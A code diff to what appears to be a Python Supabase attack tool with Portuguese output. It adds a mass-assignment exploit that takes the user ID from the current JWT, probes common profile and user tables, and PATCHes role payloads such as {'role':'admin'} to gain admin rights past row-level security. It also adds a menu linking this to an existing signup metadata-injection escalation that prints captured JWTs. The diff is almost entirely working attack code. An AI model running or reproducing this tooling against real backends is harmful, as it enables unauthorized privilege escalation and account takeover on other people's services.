@@ -811,15 +811,63 @@ class ShyyunzAuditor:
             token = await self.create_account(current_email, password, p)
             if token:
                 console.print(f"[bold green][!!!] ESCALONAMENTO BEM-SUCEDIDO![/bold green]")
-                console.print(f"[bold cyan][🚀] PAYLOAD VENCEDOR:[/bold cyan] {json.dumps(p)}")
+                console.print(f"[bold cyan][🚀] PAYLOAD VENCEDOR (Metadata Injection):[/bold cyan] {json.dumps(p)}")
                 console.print(f"[bold cyan][🔑] JWT TOKEN:[/bold cyan]\n[dim]{token}[/dim]\n")
                 self.bearer = token
                 self.headers["Authorization"] = f"Bearer {token}"
                 success = True
                 break
         if not success:
-            console.print("[yellow][!] Nenhum escalonamento funcionou neste alvo.[/yellow]")
+            console.print("[yellow][!] Nenhum escalonamento funcionou neste alvo via metadata.[/yellow]")
         return success
+
+    async def exploit_mass_assignment(self):
+        """Tenta injetar privilégios em tabelas de perfil via PATCH (Mass Assignment)."""
+        p_raw = decode_jwt_payload(self.bearer)
+        try:
+            p_data = json.loads(p_raw)
+            uid = p_data.get("sub") or p_data.get("user_id")
+            if not uid:
+                console.print("[yellow][!] Erro: UID não encontrado no Token atual. Logue primeiro.[/yellow]")
+                return False
+        except: return False
+
+        console.print(f"\n[bold magenta]─── EXPLOIT: PROFILE MASS ASSIGNMENT (ROLE ESCALATION) ───[/bold magenta]")
+        console.print(f"[*] Alvo (Seu UID): {uid}")
+        
+        # Tabelas Alvo Comuns e Colunas
+        target_tables = ["profiles", "users", "accounts", "profiles_info", "users_info", "members", "clients"]
+        id_cols = ["id", "user_id", "uuid", "uid"]
+        payloads = [
+            {"role": "admin"},
+            {"is_admin": True},
+            {"isAdmin": True},
+            {"type": "admin"},
+            {"group": "admin"},
+            {"role": "superuser"},
+            {"permission": "admin"},
+            {"access_level": 10}
+        ]
+        
+        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
+            for table in target_tables:
+                for col in id_cols:
+                    try:
+                        # 1. Verifica se a tabela e o registro existem e permitem PATCH geral (bypass de RLS)
+                        check_url = f"{self.base_url}{table}?{col}=eq.{uid}"
+                        r = await client.get(check_url, headers=self.headers)
+                        if r.status_code == 200:
+                            console.print(f"  [bold cyan][*] Tabela Interessante Detectada: {table}[/bold cyan]")
+                            for p in payloads:
+                                console.print(f"    [dim][*] Tentando Injetar {json.dumps(p)} em {table}...[/dim]")
+                                res = await client.patch(check_url, headers=self.headers, json=p)
+                                if res.status_code in [200, 204]:
+                                    console.print(f"[bold red blink][!!!] VULN: SUCESSO! Campo '{list(p.keys())[0]}' alterado para admin em '{table}'![/bold red blink]")
+                                    console.print(f"[bold green][*] Dica: Re-uploade o seu token ou vá ao painel admin para confirmar.[/bold green]")
+                                    return True
+                    except: continue
+        console.print("[yellow][-] Nenhuma vulnerabilidade de Mass Assignment explorável no momento.[/yellow]")
+        return False
 
     async def rpc_sniper(self, brain: Optional[ShyyunzBrain] = None):
         console.print("\n[bold magenta][*] Iniciando RPC Sniper & SQLi Probe...[/bold magenta]")
@@ -1472,7 +1520,11 @@ async def supabase_routine(target, apikey, site_url, bearer_token=None):
                             console.print("[bold green][+] Login Anônimo Sucesso![/bold green]")
                     else: console.print(f"[red][!] Erro: {r.text[:200]}[/red]")
             except Exception as e: console.print(f"[dim][!] Erro no Login Anônimo: {e}[/dim]")
-        elif c == "E": await auditor.exploit_escalation()
+        elif c == "E":
+            console.print("[1] Sniper Sign-up (Metadata Injection) [2] Profile Sniper (Mass Assignment)")
+            sub_c = input("\n[SHY_EXPL] Tipo de Escalada: ").strip()
+            if sub_c == "1": await auditor.exploit_escalation()
+            elif sub_c == "2": await auditor.exploit_mass_assignment()
         elif c == "6":
             idx = input("Nr. do alvo: ").strip()
             if idx in table_map:
